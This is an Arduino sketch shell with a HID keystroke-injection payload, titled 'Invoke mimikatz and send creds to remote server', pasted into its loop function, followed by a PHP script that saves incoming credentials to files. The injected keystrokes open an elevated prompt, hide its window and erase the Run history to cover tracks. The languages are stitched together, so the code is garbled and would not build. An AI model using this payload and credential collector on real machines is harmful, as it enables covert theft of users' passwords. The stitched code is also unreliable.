void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
REM Title: Invoke mimikatz and send creds to remote server
REM Author: Hak5Darren Props: Mubix, Clymb3r, Gentilkiwi
DELAY 1000

REM Open an admin command prompt 
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000

REM Obfuscate the command prompt
STRING mode con:cols=18 lines=1
ENTER
STRING color FE
ENTER

REM Clear the Run history and exit
STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
ENTER
STRING exit
ENTER

<?php
$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
file_put_contents($file, file_get_contents("php://input"));
?>


}
